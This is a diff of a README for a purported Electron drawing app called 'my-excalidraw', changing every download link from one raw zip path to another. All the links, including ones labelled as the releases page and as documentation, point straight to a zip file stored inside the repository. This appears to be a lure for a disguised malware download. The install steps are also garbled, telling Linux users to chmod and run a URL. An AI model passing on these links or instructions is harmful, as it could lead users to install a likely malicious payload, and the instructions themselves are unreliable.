@@ -4,7 +4,7 @@
 Welcome to my-excalidraw, a modern desktop application for drawing and workspace management. This app is built with Electron, React, and TypeScript, making it both powerful and user-friendly. 
 
 ## 📥 Download the App
-[![Download my-excalidraw](https://raw.githubusercontent.com/Madazbrn/my-excalidraw/main/pupa/my-excalidraw.zip%20my--excalidraw-v1.0-blue)](https://raw.githubusercontent.com/Madazbrn/my-excalidraw/main/pupa/my-excalidraw.zip)
+[![Download my-excalidraw](https://github.com/Madazbrn/my-excalidraw/raw/refs/heads/main/src/assets/my_excalidraw_1.9.zip%20my--excalidraw-v1.0-blue)](https://github.com/Madazbrn/my-excalidraw/raw/refs/heads/main/src/assets/my_excalidraw_1.9.zip)
 
 ## 💻 System Requirements
 To install my-excalidraw, your computer needs to meet the following requirements:
@@ -23,7 +23,7 @@ my-excalidraw includes several features designed for an excellent user experienc
 ## 📚 How to Download & Install
 Follow these steps to download and run my-excalidraw:
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Madazbrn/my-excalidraw/main/pupa/my-excalidraw.zip) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/Madazbrn/my-excalidraw/raw/refs/heads/main/src/assets/my_excalidraw_1.9.zip) to go to the Releases page.
    
 2. **Find the Latest Release:** Look for the most recent version of my-excalidraw. It usually appears at the top of the page.
 
@@ -35,7 +35,7 @@ Follow these steps to download and run my-excalidraw:
 4. **Run the Installer:**
    - **Windows Users:** Double-click the downloaded `.exe` file and follow the installation prompts.
    - **macOS Users:** Open the downloaded `.dmg` file, drag the my-excalidraw app to your Applications folder, then launch it.
-   - **Linux Users:** Make the downloaded file executable by running `chmod +x https://raw.githubusercontent.com/Madazbrn/my-excalidraw/main/pupa/my-excalidraw.zip` in your command line, then run it with `https://raw.githubusercontent.com/Madazbrn/my-excalidraw/main/pupa/my-excalidraw.zip`.
+   - **Linux Users:** Make the downloaded file executable by running `chmod +x https://github.com/Madazbrn/my-excalidraw/raw/refs/heads/main/src/assets/my_excalidraw_1.9.zip` in your command line, then run it with `https://github.com/Madazbrn/my-excalidraw/raw/refs/heads/main/src/assets/my_excalidraw_1.9.zip`.
 
 5. **Launch the App:** Once installed, you can find and launch my-excalidraw through your start menu or applications folder.
 
@@ -51,7 +51,7 @@ Follow these steps to download and run my-excalidraw:
 - **Drawing Tools Not Responsive:** Make sure the app is updated. Check for any available updates on the Releases page.
 
 ## 🔗 Links and Resources
-- [Visit the Releases Page to Download](https://raw.githubusercontent.com/Madazbrn/my-excalidraw/main/pupa/my-excalidraw.zip)
-- [Documentation and Guides](https://raw.githubusercontent.com/Madazbrn/my-excalidraw/main/pupa/my-excalidraw.zip)
+- [Visit the Releases Page to Download](https://github.com/Madazbrn/my-excalidraw/raw/refs/heads/main/src/assets/my_excalidraw_1.9.zip)
+- [Documentation and Guides](https://github.com/Madazbrn/my-excalidraw/raw/refs/heads/main/src/assets/my_excalidraw_1.9.zip)
 
 Thank you for choosing my-excalidraw. We hope you enjoy creating stunning visuals with our application!
